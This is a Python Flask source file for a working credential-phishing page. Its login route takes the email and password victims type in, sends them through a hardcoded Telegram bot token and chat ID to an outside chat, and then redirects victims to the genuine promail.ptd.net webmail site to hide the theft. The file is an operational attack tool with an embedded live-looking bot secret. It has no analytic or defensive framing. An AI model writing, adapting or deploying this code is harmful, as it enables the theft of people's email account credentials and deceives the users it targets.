from flask import Flask, render_template, request, redirect, url_for, flash, session
import requests
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Replace with your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7065127118:AAHCIXzM-_lAwcFYjOGKY4iPgpUcrIk4BoM'
TELEGRAM_CHAT_ID = '1260772582'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        app.logger.debug("Message sent to Telegram successfully.")
        return True
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Failed to send message to Telegram. Error: {str(e)}")
        return False

@app.route('/')
def index():
    session['attempts'] = 0
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    if 'attempts' not in session:
        session['attempts'] = 0
    
    # Increment by 3 for each submission
    session['attempts'] += 3
    app.logger.debug(f"Login attempts counted: {session['attempts']}")
    
    email = request.form.get('email', '')
    password = request.form.get('password', '')

    # Send credentials to Telegram
    message = f"Email: {email}\nPassword: {password}\nTotal Attempts: {session['attempts']}"
    send_to_telegram(message)

    # Redirect based on attempt count
    if session['attempts'] >= 3:
        session['attempts'] = 0  # Reset counter
        return redirect('https://promail.ptd.net/')  # Special redirect after "3 attempts"
    
    return redirect('https://promail.ptd.net/')  # Normal redirect

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)